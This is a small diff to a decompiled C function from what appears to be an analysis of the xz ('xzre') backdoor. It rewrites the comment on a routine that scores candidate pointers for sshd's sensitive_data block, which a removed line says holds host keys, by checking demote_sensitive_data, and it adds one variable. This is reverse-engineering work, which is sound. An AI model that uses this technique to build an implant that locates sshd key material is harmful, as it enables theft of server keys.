@@ -5,7 +5,9 @@
 
 
 /*
- * AutoDoc: Looks inside `demote_sensitive_data` for direct references to the candidate pointer and emits a high score when it finds them. That strong signal helps the backdoor confirm it has located the structure that carries host keys between privilege transitions.
+ * AutoDoc: Disassembles the `demote_sensitive_data` helper referenced in the string table and returns
+ * three points if it ever references the candidate pointer. That routine is highly specific to
+ * the real sensitive_data block, so even a single hit is treated as strong evidence.
  */
 #include "xzre_types.h"
 
@@ -17,6 +19,7 @@ int sshd_get_sensitive_data_score_in_demote_sensitive_data
   u8 *code_start;
   BOOL BVar1;
   int iVar2;
+  u8 *demote_start;
   
   code_start = (u8 *)refs->entries[3].func_start;
   if (code_start != (u8 *)0x0) {
